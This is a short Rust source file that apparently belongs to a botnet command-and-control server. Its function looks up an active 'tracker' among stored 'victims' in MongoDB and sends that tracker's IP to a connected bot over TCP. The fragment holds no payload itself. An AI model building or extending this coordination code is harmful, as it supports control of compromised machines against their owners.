use crate::victim::Victim;

use tokio::{net::TcpStream, io::AsyncWriteExt};
use mongodb::Collection;
use mongodb::bson::{doc, to_bson};

use crate::victim::{VictimDb, VictimType};

pub async fn manage_bot(_victim: &Victim, stream: &mut TcpStream, victims_collection: &Collection<VictimDb>) -> Result<(), Box<dyn std::error::Error>> {
    let tracker = victims_collection.find_one(doc! {"status": true, "victim_type": to_bson(&VictimType::Tracker).unwrap() }, None).await.unwrap();
    // let tracker: Option<VictimDb> = Some(VictimDb {ip: "192.168.1.1".to_string(), victim_type: VictimType::Bot, active: true});

    if let Some(tracker) = tracker {
        stream.write_all(b"trackers\n").await?;
        stream.write_all((tracker.ip.to_string() + "\r\n").as_bytes()).await?;
    } else {
        stream.write_all(b"trackers\n\r\n").await?;
    }

    Ok(())
}
